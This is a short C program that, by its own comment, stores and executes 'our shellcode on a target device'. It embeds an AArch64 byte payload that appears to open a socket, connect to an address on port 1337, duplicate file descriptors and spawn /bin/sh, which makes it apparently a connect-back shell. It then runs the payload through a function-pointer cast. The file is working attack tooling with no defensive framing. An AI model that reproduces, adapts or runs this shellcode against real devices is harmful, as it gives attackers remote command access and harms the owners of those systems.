#include <stdio.h> 
#include <string.h>
/* This program will serve as a "wrapper" utility to both store and execute our shellcode on a target device */

typedef void (*execShellcode)();

void main() {

	unsigned char shellcode[] = 
"\x40\x00\x80\xd2\x21\x00\x80\xd2\x02\x00\x80\xd2\xc8\x18\x80\x52\x21\x00\x00\xd4"
"\xe4\x03\x00\xaa\xe0\x03\x04\xaa\xc1\x02\x00\x10\x02\x02\x80\xd2\x68\x19\x80\x52"
"\x21\x00\x00\xd4\xe0\x03\x04\xaa\x01\x00\x80\xd2\x02\x00\x80\xd2\x08\x03\x80\x52"
"\x21\x00\x00\xd4\xe0\x03\x04\xaa\x21\x00\x80\xd2\x00\x00\x80\xd2\x21\x00\x00\xd4"
"\xe0\x03\x04\xaa\x41\x00\x80\xd2\x02\x00\x80\xd2\x21\x00\x00\xd4\xe0\x00\x00\x10"
"\x01\x00\x80\xd2\x02\x00\x80\xd2\xa8\x1b\x80\x52\x21\x00\x00\xd4\x02\x00\x05\x39"
"\x00\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68";

	printf("Shellcode length: %zu\n", sizeof(shellcode));
	
	// Shellcode to fp
	execShellcode func = (execShellcode)shellcode;

	// Execute shellcode
	printf("Executing shellcode...\n");
	func();

}
